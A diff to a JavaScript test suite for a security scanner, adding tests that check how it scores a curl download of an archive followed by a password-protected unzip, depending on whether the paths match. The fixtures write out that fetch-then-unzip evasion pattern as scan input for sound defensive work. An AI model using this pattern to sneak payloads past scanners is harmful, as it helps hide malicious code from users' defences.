@@ -108,6 +108,28 @@ describe('SMI-6033 Wave 2 password-protected archive evasion', () => {
     expect(scanner.scan('t', content).passed).toBe(true)
   })
 
+  // SMI-6033 Wave 3 (adversarial-review fix): the shared fetch-correlation
+  // utility is directory-path-aware, so a coincidental BASENAME collision
+  // between the fetched archive and a DIFFERENT, same-named archive elsewhere
+  // in the tree no longer supplies the provenance condition for critical.
+  it('archive target sharing only a BASENAME with the fetch destination (different directories) stays medium', () => {
+    const content =
+      'curl -o /tmp/assets.zip https://vendor.example/assets.zip\n' +
+      `unzip -P ${REAL_PASSWORD} ./vendor/font-pack/assets.zip`
+    const f = ae(scanner.scan('t', content).findings)
+    expect(f.length).toBeGreaterThan(0)
+    expect(f.every((x) => x.severity !== 'critical')).toBe(true)
+    expect(f[0].severity).toBe('medium')
+  })
+
+  it('TP control: the SAME directory on both sides still correlates -> critical', () => {
+    const content =
+      'curl -o /tmp/assets.zip https://vendor.example/assets.zip\n' +
+      `unzip -P ${REAL_PASSWORD} /tmp/assets.zip`
+    const f = ae(scanner.scan('t', content).findings)
+    expect(f.some((x) => x.severity === 'critical')).toBe(true)
+  })
+
   it('a bare mention of "zip" or "password" alone (no co-occurrence) does not fire', () => {
     expect(
       ae(scanner.scan('t', 'This skill zips up your project directory.').findings)
